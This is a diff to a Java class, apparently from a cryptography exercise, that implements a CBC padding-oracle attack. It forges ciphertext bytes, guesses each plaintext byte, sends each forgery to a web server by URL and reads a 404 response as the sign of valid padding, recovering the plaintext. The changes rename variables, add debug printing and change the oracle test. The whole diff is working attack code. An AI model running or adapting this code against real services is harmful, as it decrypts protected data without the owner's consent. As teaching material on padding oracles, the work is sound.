@@ -15,28 +15,34 @@ public class PaddingOracle {
 		ByteSequence plain = new ByteSequence(new byte[bytes.length()]);
 		// BlockSequence blocks = new BlockSequence(16, bytes);
 
-		for (int i = bytes.length() - 1, attLength = 1; i > 15; i--, attLength = (attLength + 1) % 16) {
+		for (int orgPos = bytes.length() - 1, attLength = 1; orgPos > 15; orgPos--, attLength = (attLength + 1) % 16) {
 			while (attLength <= 0) {
 				attLength += 16;
 			}
 			ByteSequence attack = new ByteSequence(bytes.getByteArray().clone());
-			int attPos = i - 16;
+			int attPos = orgPos - 16;
 			// ByteSequence origBytes = bytes.range(attPos, attPos + attLength);
-			for (int g = 0; g < 256; g++) {
-				plain.setByteAt(i, (byte) g);
-				for (int y = 0; y < attLength; y++) {
-					byte subs = (byte) (bytes.byteAt(attPos + y) ^ g ^ attLength);
-					attack.setByteAt(attPos + y, subs);
+			for (int guess = 0; guess < 256; guess++) {
+				//if (guess == attLength) {
+				//	continue;
+				//}
+				plain.setByteAt(orgPos, (byte) guess);
+				for (int i = 0; i < attLength; i++) {
+					byte subs = (byte) (bytes.byteAt(attPos + i) ^ guess ^ attLength);
+					attack.setByteAt(attPos + i, subs);
 				}
-				System.out.println(attack.toHexString());
+				System.out.println("orgPos: " + orgPos + "; attLength: "
+						+ attLength + "; attPos: " + attPos + "; guess: "
+						+ guess + "; attack: " + attack.toHexString());
 				URL url = new URL(baseURL + attack.toHexString());
-				if (getResponseCode(url) != 403) {
-					System.out.println("Character at position " + i + ": "
-							+ g);
+				if (getResponseCode(url) == 404) {
+					System.out.println("Character at position " + orgPos + ": "
+							+ guess);
 					break;
 				}
 			}
 		}
+		System.out.println("Response: " + plain.toHexString());
 		System.out.println("Response: " + plain.toString());
 	}
 
